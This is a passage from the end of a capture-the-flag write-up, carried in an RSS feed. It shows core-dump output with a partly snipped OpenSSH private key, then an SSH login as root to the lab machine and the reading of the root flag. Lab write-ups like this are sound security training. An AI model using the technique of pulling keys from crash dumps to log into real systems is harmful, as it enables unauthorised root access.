+</span></span><span class="line"><span class="cl">□☺□$□□□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□□xWU□□wȏ♥□□□xWU□□□□□□□□□□□xWU□□□□□□wȏ<span class="sb">`</span>□wȏ◄►-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span class="line"><span class="cl">NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
+</span></span><span class="line"><span class="cl">KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9
+</span></span><span class="line"><span class="cl">6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl
+</span></span><span class="line"><span class="cl">xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k
+</span></span><span class="line"><span class="cl"><span class="nv">fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA</span><span class="o">==</span>
+</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div><p>With that key, I can SSH login as root and grab the root flag!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ ssh -i coredump.ssh root@10.10.11.120
+</span></span><span class="line"><span class="cl">The authenticity of host <span class="s1">&#39;10.10.11.120 (10.10.11.120)&#39;</span> can<span class="s1">&#39;t be established.
+</span></span></span><span class="line"><span class="cl"><span class="s1">ECDSA key fingerprint is SHA256:YNT38/psf6LrGXZJZYJVglUOKXjstxzWK5JJU7zzp3g.
+</span></span></span><span class="line"><span class="cl"><span class="s1">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class="line"><span class="cl"><span class="s1">Warning: Permanently added &#39;</span>10.10.11.120<span class="err">&#39;</span> <span class="o">(</span>ECDSA<span class="o">)</span> to the list of known hosts.
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-89-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/advantage
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System information as of Sun <span class="m">31</span> Oct <span class="m">2021</span> 08:16:22 AM UTC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.0               Processes:             <span class="m">223</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   52.8% of 8.79GB   Users logged in:       <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 20%               IPv4 address <span class="k">for</span> eth0: 10.10.11.120
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Sun Oct <span class="m">31</span> 07:47:50 <span class="m">2021</span> from 10.10.14.91
+</span></span><span class="line"><span class="cl">root@secret:~# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@secret:~# cat root.txt
+</span></span><span class="line"><span class="cl">d1d6d....<span class="o">[</span>SNIP<span class="o">]</span>....
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
